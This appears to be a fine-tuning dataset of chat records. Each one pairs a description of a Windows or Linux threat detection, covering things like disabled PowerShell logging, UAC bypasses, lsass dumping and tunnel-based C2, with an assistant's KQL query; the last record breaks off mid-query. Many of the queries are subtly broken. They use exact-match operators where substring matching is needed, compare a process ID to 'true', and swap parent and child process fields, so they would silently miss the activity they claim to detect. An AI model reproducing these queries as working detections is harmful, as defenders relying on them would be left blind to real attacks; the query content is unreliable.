{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects changes to the registry for the currently logged-in user. In order to disable PowerShell module logging, script block logging or transcription and script execution logging Topic: registry_set_powershell_logging_disabled"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (RegistryKey endswith \"\\\\Microsoft\\\\Windows\\\\PowerShell*\" or RegistryKey endswith \"\\\\Microsoft\\\\PowerShellCore*\") and (RegistryKey endswith \"\\\\ModuleLogging\\\\EnableModuleLogging\" or RegistryKey endswith \"\\\\ScriptBlockLogging\\\\EnableScriptBlockLogging\" or RegistryKey endswith \"\\\\ScriptBlockLogging\\\\EnableScriptBlockInvocationLogging\" or RegistryKey endswith \"\\\\Transcription\\\\EnableTranscripting\" or RegistryKey endswith \"\\\\Transcription\\\\EnableInvocationHeader\" or RegistryKey endswith \"\\\\EnableScripts\") and RegistryValueData =~ \"DWORD (0x00000000)\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a process spawned by the terminal service server process (this could be an indicator for an exploitation of CVE-2019-0708) Topic: proc_creation_win_svchost_termserv_proc_spawn"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessCommandLine in~ (\"\\\\svchost.exe\", \"termsvcs\")) and (not(((InitiatingProcessFolderPath in~ (\"\\\\rdpclip.exe\", \":\\\\Windows\\\\System32\\\\csrss.exe\", \":\\\\Windows\\\\System32\\\\wininit.exe\", \":\\\\Windows\\\\System32\\\\winlogon.exe\")) or isnull(FolderPath))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of powershell scripts via Runscripthelper.exe Topic: proc_creation_win_lolbin_runscripthelper"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"surfacecheck\" and InitiatingProcessFolderPath =~ \"\\\\Runscripthelper.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution \"AccCheckConsole\" a command-line tool for verifying the accessibility implementation of an applications UI.\nOne of the tests that this checker can run are called \"verification routine\", which tests for things like Consistency, Navigation, etc.\nThe tool allows a user to provide a DLL that can contain a custom \"verification routine\". An attacker can build such DLLs and pass it via the CLI, which would then be loaded in the context of the \"AccCheckConsole\" utility.\n Topic: proc_creation_win_acccheckconsole_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\" -hwnd\", \" -process \", \" -window \")) and (FolderPath endswith \"\\\\AccCheckConsole.exe\" or ProcessVersionInfoOriginalFileName =~ \"AccCheckConsole.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects svchost hosting RDP termsvcs communicating to target systems on TCP port 80 or 443 Topic: net_connection_win_rdp_to_http"}, {"role": "assistant", "content": "DeviceNetworkEvents\n| where InitiatingProcessId =~ \"true\" and InitiatingProcessFolderPath =~ \"\\\\svchost.exe\" and (RemotePort in~ (\"80\", \"443\")) and LocalPort == 3389"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects disabling Windows Defender PUA protection Topic: registry_set_disabled_pua_protection_on_microsoft_defender"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey contains \"\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\PUAProtection\" and RegistryValueData =~ \"DWORD (0x00000000)\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of specific files inside of ProgramData directory.\nThese files were seen being created by Forest Blizzard as described by MSFT.\n Topic: file_event_win_apt_forest_blizzard_activity"}, {"role": "assistant", "content": "DeviceFileEvents\n| where (FileName in~ (\"\\\\prnms003.inf_\", \"\\\\prnms009.inf_\")) or (FileName =~ \"C:\\\\ProgramData\\\\\" and ((FileName in~ (\".save\", \"\\\\doit.bat\", \"\\\\execute.bat\", \"\\\\servtask.bat\")) or FileName =~ \".dll\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects various command line and scripting engines/processes such as \"PowerShell\", \"Wscript\", \"Cmd\", etc. spawning a \"regsvr32\" instance. Topic: proc_creation_win_regsvr32_susp_parent"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((InitiatingProcessFileName in~ (\"\\\\cmd.exe\", \"\\\\cscript.exe\", \"\\\\mshta.exe\", \"\\\\powershell_ise.exe\", \"\\\\powershell.exe\", \"\\\\pwsh.exe\", \"\\\\wscript.exe\")) and InitiatingProcessFolderPath =~ \"\\\\regsvr32.exe\") and (not((ProcessCommandLine endswith \" /s C:\\\\Windows\\\\System32\\\\RpcProxy\\\\RpcProxy.dll\" and InitiatingProcessFileName =~ \"C:\\\\Windows\\\\System32\\\\cmd.exe\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects Winword starting uncommon sub process FLTLDR.exe as used in exploits for CVE-2017-0261 and CVE-2017-0262 Topic: proc_creation_win_exploit_cve_2017_0261"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where FolderPath contains \"\\\\FLTLDR.exe\" and InitiatingProcessFileName =~ \"\\\\WINWORD.EXE\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of file by the \"node.exe\" process in the \".vscode-server\" directory. Could be a sign of remote file creation via VsCode tunnel feature\n Topic: file_event_win_vscode_tunnel_remote_creation_artefacts"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \"\\\\.vscode-server\\\\data\\\\User\\\\History\\\\\" and InitiatingProcessFolderPath contains \"\\\\servers\\\\Stable-\" and InitiatingProcessFolderPath =~ \"\\\\server\\\\node.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of inline Python code via the \"-c\" in order to call the \"system\" function from the \"os\" library, and spawn a shell.\n Topic: proc_creation_lnx_python_shell_os_system"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"/bin/bash\", \"/bin/dash\", \"/bin/fish\", \"/bin/sh\", \"/bin/zsh\")) and ((FolderPath endswith \"/python\" or FolderPath endswith \"/python2\" or FolderPath endswith \"/python3\") or (FolderPath contains \"/python2.\" or FolderPath contains \"/python3.\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detect use of icacls to deny access for everyone in Users folder sometimes used to hide malicious files Topic: proc_creation_win_icacls_deny"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"/deny\") or ProcessCommandLine endswith \"S-1-1-0:\") and (ProcessVersionInfoOriginalFileName =~ \"iCACLS.EXE\" or FolderPath endswith \"\\\\icacls.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of a renamed ProcDump executable.\nThis often done by attackers or malware in order to evade defensive mechanisms.\n Topic: proc_creation_win_renamed_sysinternals_procdump"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessVersionInfoOriginalFileName =~ \"procdump\" or ((ProcessCommandLine contains \" -ma \" or ProcessCommandLine contains \" /ma \" or ProcessCommandLine contains \" \u2013ma \" or ProcessCommandLine contains \" \u2014ma \" or ProcessCommandLine contains \" \u2015ma \" or ProcessCommandLine contains \" -mp \" or ProcessCommandLine contains \" /mp \" or ProcessCommandLine contains \" \u2013mp \" or ProcessCommandLine contains \" \u2014mp \" or ProcessCommandLine contains \" \u2015mp \") and (ProcessCommandLine contains \" -accepteula\" or ProcessCommandLine contains \" /accepteula\" or ProcessCommandLine contains \" \u2013accepteula\" or ProcessCommandLine contains \" \u2014accepteula\" or ProcessCommandLine contains \" \u2015accepteula\"))) and (not((InitiatingProcessFolderPath in~ (\"\\\\procdump.exe\", \"\\\\procdump64.exe\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "A general detection for processes creating PFX files. This could be an indicator of an adversary exporting a local certificate to a PFX file. Topic: file_event_win_susp_pfx_file_creation"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \".pfx\" and (not((FileName in~ (\"\\\\Templates\\\\Windows\\\\Windows_TemporaryKey.pfx\", \"\\\\CMake\\\\\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the use of Tor or Tor-Browser to connect to onion routing networks Topic: proc_creation_win_browsers_tor_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFolderPath in~ (\"\\\\tor.exe\", \"\\\\Tor Browser\\\\Browser\\\\firefox.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of \".rev\" files by WinRAR. Could be indicative of potential exploitation of CVE-2023-40477. Look for a suspicious execution shortly after creation or a WinRAR application crash. Topic: file_event_win_exploit_cve_2023_40477_winrar_rev_file_abuse"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \".rev\" and (InitiatingProcessFolderPath in~ (\"\\\\explorer.exe\", \"\\\\WinRAR.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the use of Dumpert process dumper, which dumps the lsass.exe process memory Topic: proc_creation_win_hktl_dumpert"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where MD5 startswith \"09D278F9DE118EF09163C6140255C690\" or ProcessCommandLine contains \"Dumpert.dll\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects creation of files with the \".pub\" extension in suspicious or uncommon locations. This could be a sign of attackers abusing Publisher documents Topic: file_event_win_office_publisher_files_in_susp_locations"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \".pub\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects an exploitation attempt in which the UAC consent dialogue is used to invoke an Internet Explorer process running as LOCAL_SYSTEM Topic: proc_creation_win_exploit_cve_2019_1388"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessFileName =~ \"\\\\consent.exe\" and ProcessCommandLine =~ \" http\" and InitiatingProcessFolderPath =~ \"\\\\iexplore.exe\") and ((ProcessIntegrityLevel in~ (\"System\", \"S-1-16-16384\")) or (AccountName contains \"AUTHORI\" or AccountName contains \"AUTORI\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of the WMI class \"Win32_NTEventlogFile\" in a potentially suspicious way (delete, backup, change permissions, etc.) from a PowerShell script Topic: proc_creation_win_susp_nteventlogfile_usage"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"Win32_NTEventlogFile\" and (ProcessCommandLine in~ (\".BackupEventlog(\", \".ChangeSecurityPermissions(\", \".ChangeSecurityPermissionsEx(\", \".ClearEventLog(\", \".Delete(\", \".DeleteEx(\", \".Rename(\", \".TakeOwnerShip(\", \".TakeOwnerShipEx(\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detect modification of services configuration (ImagePath, FailureCommand and ServiceDLL) in registry by processes with Medium integrity level Topic: proc_creation_win_registry_privilege_escalation_via_service_key"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessIntegrityLevel in~ (\"Medium\", \"S-1-16-8192\")) and (ProcessCommandLine in~ (\"\\\\ImagePath\", \"\\\\FailureCommand\", \"\\\\ServiceDll\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the use of the WMI command-line (WMIC) utility to identify and display various system information,\nincluding OS, CPU, GPU, and disk drive names; memory capacity; display resolution; and baseboard, BIOS,\nand GPU driver products/versions.\nSome of these commands were used by Aurora Stealer in late 2022/early 2023.\n Topic: proc_creation_win_wmic_recon_system_info_uncommon"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"LOGICALDISK get Name,Size,FreeSpace\", \"os get Caption,OSArchitecture,Version\")) and (ProcessVersionInfoFileDescription =~ \"WMI Commandline Utility\" or ProcessVersionInfoOriginalFileName =~ \"wmic.exe\" or FolderPath endswith \"\\\\WMIC.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential DLL sideloading of \"CCleanerDU.dll\" Topic: image_load_side_load_ccleaner_du"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where FolderPath endswith \"\\\\CCleanerDU.dll\" and (not((InitiatingProcessFolderPath in~ (\"\\\\CCleaner.exe\", \"\\\\CCleaner64.exe\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects Rclone config files being created Topic: file_event_win_rclone_config_files"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName in~ (\":\\\\Users\\\\\", \"\\\\.config\\\\rclone\\\\\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects enumeration of local network configuration Topic: proc_creation_lnx_system_network_discovery"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"/etc/resolv.conf\" or (InitiatingProcessFolderPath in~ (\"/firewall-cmd\", \"/ufw\", \"/iptables\", \"/netstat\", \"/ss\", \"/ip\", \"/ifconfig\", \"/systemd-resolve\", \"/route\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a regedit started with TrustedInstaller privileges or by ProcessHacker.exe Topic: proc_creation_win_regedit_trustedinstaller"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessFileName in~ (\"\\\\TrustedInstaller.exe\", \"\\\\ProcessHacker.exe\")) and InitiatingProcessFolderPath =~ \"\\\\regedit.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of the Add-In deployment cache updating utility (AddInutil.exe) with suspicious Addinroot or Pipelineroot paths. An adversary may execute AddinUtil.exe with uncommon Addinroot/Pipelineroot paths that point to the adversaries Addins.Store payload.\n Topic: proc_creation_win_addinutil_suspicious_cmdline"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath endswith \"\\\\addinutil.exe\" or ProcessVersionInfoOriginalFileName =~ \"AddInUtil.exe\") and (((ProcessCommandLine in~ (\"-AddInRoot:\", \"-PipelineRoot:\")) and (ProcessCommandLine in~ (\"\\\\AppData\\\\Local\\\\Temp\\\\\", \"\\\\Desktop\\\\\", \"\\\\Downloads\\\\\", \"\\\\Users\\\\Public\\\\\", \"\\\\Windows\\\\Temp\\\\\"))) or ((InitiatingProcessFolderPath in~ (\"\\\\AppData\\\\Local\\\\Temp\\\\\", \"\\\\Desktop\\\\\", \"\\\\Downloads\\\\\", \"\\\\Users\\\\Public\\\\\", \"\\\\Windows\\\\Temp\\\\\")) and (ProcessCommandLine in~ (\"-AddInRoot:.\", \"-AddInRoot:\\\".\\\"\", \"-PipelineRoot:.\", \"-PipelineRoot:\\\".\\\"\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potentially suspicious child processes spawned by PowerShell.\nUse this rule to hunt for potential anomalies initiating from PowerShell scripts and commands.\n Topic: proc_creation_win_powershell_susp_child_processes"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((InitiatingProcessFileName in~ (\"\\\\powershell_ise.exe\", \"\\\\powershell.exe\", \"\\\\pwsh.exe\")) and (InitiatingProcessFolderPath in~ (\"\\\\bash.exe\", \"\\\\bitsadmin.exe\", \"\\\\certutil.exe\", \"\\\\cscript.exe\", \"\\\\forfiles.exe\", \"\\\\hh.exe\", \"\\\\mshta.exe\", \"\\\\regsvr32.exe\", \"\\\\rundll32.exe\", \"\\\\schtasks.exe\", \"\\\\scrcons.exe\", \"\\\\scriptrunner.exe\", \"\\\\sh.exe\", \"\\\\wmic.exe\", \"\\\\wscript.exe\"))) and (not(((ProcessCommandLine =~ \"-verifystore \" and InitiatingProcessFolderPath =~ \"\\\\certutil.exe\") or ((ProcessCommandLine in~ (\"qfe list\", \"diskdrive \", \"csproduct \", \"computersystem \", \" os \", \"\")) and InitiatingProcessFolderPath =~ \"\\\\wmic.exe\")))) and (not((InitiatingProcessCommandLine =~ \"\\\\Program Files\\\\Amazon\\\\WorkspacesConfig\\\\Scripts\\\\\" and ProcessCommandLine =~ \"\\\\Program Files\\\\Amazon\\\\WorkspacesConfig\\\\Scripts\\\\\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a command line process that uses explorer.exe to launch arbitrary commands or binaries,\nwhich is similar to cmd.exe /c, only it breaks the process tree and makes its parent a new instance of explorer spawning from \"svchost\"\n Topic: proc_creation_win_explorer_break_process_tree"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine contains \"/factory,{75dff2b7-6936-4c06-a8bb-676a7b00b24b}\" or ((ProcessCommandLine contains \"explorer.exe\") and (ProcessCommandLine contains \" -root,\" or ProcessCommandLine contains \" /root,\" or ProcessCommandLine contains \" \u2013root,\" or ProcessCommandLine contains \" \u2014root,\" or ProcessCommandLine contains \" \u2015root,\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the pattern of UAC Bypass using a path parsing issue in winsat.exe (UACMe 52) Topic: file_event_win_uac_bypass_winsat"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName in~ (\"\\\\AppData\\\\Local\\\\Temp\\\\system32\\\\winsat.exe\", \"\\\\AppData\\\\Local\\\\Temp\\\\system32\\\\winmm.dll\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the deletion of files by the Sysinternals SDelete utility. It looks for the common name pattern used to rename files. Topic: file_delete_win_sysinternals_sdelete_file_deletion"}, {"role": "assistant", "content": "DeviceFileEvents\n| where (FileName in~ (\".AAA\", \".ZZZ\")) and (not(FileName =~ \"\\\\Wireshark\\\\radius\\\\dictionary.alcatel-lucent.aaa\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects an uncommon svchost parent process Topic: proc_creation_win_svchost_uncommon_parent_process"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFolderPath =~ \"\\\\svchost.exe\" and (not(((InitiatingProcessFileName in~ (\"\\\\Mrt.exe\", \"\\\\MsMpEng.exe\", \"\\\\ngen.exe\", \"\\\\rpcnet.exe\", \"\\\\services.exe\", \"\\\\TiWorker.exe\")) or (InitiatingProcessFileName in~ (\"-\", \"\")) or isnull(InitiatingProcessFileName))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects command line activity that tries to clear or disable any ETW trace log which could be a sign of logging evasion.\n Topic: proc_creation_win_susp_etw_trace_evasion"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"cl\", \"/Trace\")) or (ProcessCommandLine in~ (\"clear-log\", \"/Trace\")) or (ProcessCommandLine in~ (\"sl\", \"/e:false\")) or (ProcessCommandLine in~ (\"set-log\", \"/e:false\")) or (ProcessCommandLine in~ (\"logman\", \"update\", \"trace\", \"--p\", \"-ets\")) or ProcessCommandLine =~ \"Remove-EtwTraceProvider\" or (ProcessCommandLine in~ (\"Set-EtwTraceProvider\", \"0x11\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects uncommon network connections to the Active Directory Web Services (ADWS) from processes not typically associated with ADWS management.\n Topic: net_connection_win_adws_unusual_connection"}, {"role": "assistant", "content": "DeviceNetworkEvents\n| where (InitiatingProcessId =~ true and RemotePort == 9389) and (not((InitiatingProcessFolderPath =~ \"C:\\\\Windows\\\\system32\\\\dsac.exe\" or InitiatingProcessFolderPath =~ \"C:\\\\Program Files\\\\Microsoft Monitoring Agent\\\\\" or (InitiatingProcessFolderPath in~ (\"C:\\\\Program Files\\\\PowerShell\\\\7\\\\pwsh.exe\", \"C:\\\\Program Files\\\\PowerShell\\\\7-preview\\\\pwsh.ex\", \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\\", \"C:\\\\Windows\\\\SysWOW64\\\\WindowsPowerShell\\\\\")))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects an UAC bypass that uses changepk.exe and slui.exe (UACMe 61) Topic: proc_creation_win_uac_bypass_changepk_slui"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"\\\\slui.exe\" and (InitiatingProcessIntegrityLevel in~ (\"High\", \"System\", \"S-1-16-16384\", \"S-1-16-12288\")) and InitiatingProcessFolderPath =~ \"\\\\changepk.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects renamed Visual Studio Code tunnel execution. Attackers can abuse this functionality to establish a C2 channel Topic: proc_creation_win_vscode_tunnel_renamed_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (((ProcessCommandLine endswith \".exe tunnel\" and isnull(ProcessVersionInfoOriginalFileName)) or (ProcessCommandLine in~ (\".exe tunnel\", \"--name \", \"--accept-server-license-terms\")) or (ProcessCommandLine in~ (\"tunnel \", \"service\", \"internal-run\", \"tunnel-service.log\"))) and (not((InitiatingProcessFolderPath in~ (\"\\\\code-tunnel.exe\", \"\\\\code.exe\"))))) or ((InitiatingProcessCommandLine =~ \" tunnel\" and (ProcessCommandLine in~ (\"/d /c \", \"\\\\servers\\\\Stable-\", \"code-server.cmd\")) and InitiatingProcessFolderPath =~ \"\\\\cmd.exe\") and (not((InitiatingProcessFileName in~ (\"\\\\code-tunnel.exe\", \"\\\\code.exe\")))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detect commandline usage of Microsoft Connection Manager Profile Installer (cmstp.exe) to install specially formatted local .INF files Topic: proc_creation_win_uac_bypass_cmstp"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"/s\", \"-s\", \"/au\", \"-au\", \"/ni\", \"-ni\")) and (FolderPath endswith \"\\\\cmstp.exe\" or ProcessVersionInfoOriginalFileName =~ \"CMSTP.EXE\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects registry modifications that disable internal tools or functions in explorer (malware like Agent Tesla uses this technique) Topic: registry_set_set_nopolicies_user"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (RegistryKey endswith \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\Explorer\\\\NoLogOff\" or RegistryKey endswith \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\Explorer\\\\NoDesktop\" or RegistryKey endswith \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\Explorer\\\\NoRun\" or RegistryKey endswith \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\Explorer\\\\NoFind\" or RegistryKey endswith \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\Explorer\\\\NoControlPanel\" or RegistryKey endswith \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\Explorer\\\\NoFileMenu\" or RegistryKey endswith \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\Explorer\\\\NoClose\" or RegistryKey endswith \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\Explorer\\\\NoSetTaskbar\" or RegistryKey endswith \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\Explorer\\\\NoPropertiesMyDocuments\" or RegistryKey endswith \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\Explorer\\\\NoTrayContextMenu\") and RegistryValueData =~ \"DWORD (0x00000001)\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of files in a specific location by ScreenConnect RMM.\nScreenConnect has feature to remotely execute binaries on a target machine. These binaries will be dropped to \":\\Users\\<username>\\Documents\\ConnectWiseControl\\Temp\\\" before execution.\n Topic: file_event_win_remote_access_tools_screenconnect_remote_file"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \"\\\\Documents\\\\ConnectWiseControl\\\\Temp\\\\\" and InitiatingProcessFolderPath =~ \"\\\\ScreenConnect.WindowsClient.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects creation of a Python path configuration file (.pth) in Python library folders, which can be maliciously abused for code execution and persistence.\nModules referenced by these files are run at every Python startup (v3.5+), regardless of whether the module is imported by the calling script.\nDefault paths are \\lib\\site-packages\\*.pth (Windows) and /lib/pythonX.Y/site-packages/*.pth (Unix and macOS).\n Topic: file_event_macos_python_path_configuration_files"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \".pth\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious Splwow64.exe process without any command line parameters Topic: proc_creation_win_splwow64_cli_anomaly"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine endswith \"splwow64.exe\" and InitiatingProcessFolderPath =~ \"\\\\splwow64.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects use of WSReset.exe to bypass User Account Control (UAC). Adversaries use this technique to execute privileged processes. Topic: proc_creation_win_uac_bypass_wsreset"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"\\\\wsreset.exe\" and (not((FolderPath endswith \"\\\\conhost.exe\" or ProcessVersionInfoOriginalFileName =~ \"CONHOST.EXE\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects modification of autostart extensibility point (ASEP) in registry. Topic: registry_set_asep_reg_keys_modification_wow6432node_classes"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey contains \"\\\\Software\\\\Wow6432Node\\\\Classes\" and (RegistryKey contains \"\\\\Folder\\\\ShellEx\\\\ExtShellFolderViews\" or RegistryKey contains \"\\\\Folder\\\\ShellEx\\\\DragDropHandlers\" or RegistryKey contains \"\\\\Folder\\\\ShellEx\\\\ColumnHandlers\" or RegistryKey contains \"\\\\Directory\\\\Shellex\\\\DragDropHandlers\" or RegistryKey contains \"\\\\Directory\\\\Shellex\\\\CopyHookHandlers\" or RegistryKey contains \"\\\\CLSID\\\\{AC757296-3522-4E11-9862-C17BE5A1767E}\\\\Instance\" or RegistryKey contains \"\\\\CLSID\\\\{ABE3B9A4-257D-4B97-BD1A-294AF496222E}\\\\Instance\" or RegistryKey contains \"\\\\CLSID\\\\{7ED96837-96F0-4812-B211-F13C24117ED3}\\\\Instance\" or RegistryKey contains \"\\\\CLSID\\\\{083863F1-70DE-11d0-BD40-00A0C911CE86}\\\\Instance\" or RegistryKey contains 